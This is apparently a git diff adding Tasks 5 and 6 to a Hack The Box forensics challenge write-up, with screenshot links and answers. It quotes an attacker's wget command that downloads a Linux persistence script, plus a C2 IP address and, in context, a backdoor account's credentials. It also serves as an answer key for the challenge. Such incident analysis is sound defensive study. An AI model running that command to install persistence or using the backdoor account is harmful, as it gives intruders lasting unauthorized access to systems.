@@ -59,3 +59,18 @@ For the next few tasks, we just need to read through the entire conversation to 
 ![backdooracc.png](/TellyHTB/screenshots/backdooracc.png)
 
 Answer: ```cleanupsvc:YouKnowWhoiam69```
+
+# Task 5: What was the full command the attacker used to download the persistence script?
+
+![wget.png](/TellyHTB/screenshots/wget.png)
+
+Answer: ```wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh```
+
+# Task 6: The attacker installed remote access persistence using the persistence script. What is the C2 IP address?
+
+> A Command and Control (C2) IP address is a malicious address used by threat actors to manage compromised systems and steal data. These IPs are dynamic, often utilizing proxies or redirectors to evade detection. 
+
+![c2ipaddress.png](/TellyHTB/screenshots/c2ipaddress.png)
+
+Answer: ```91.99.25.54```
+
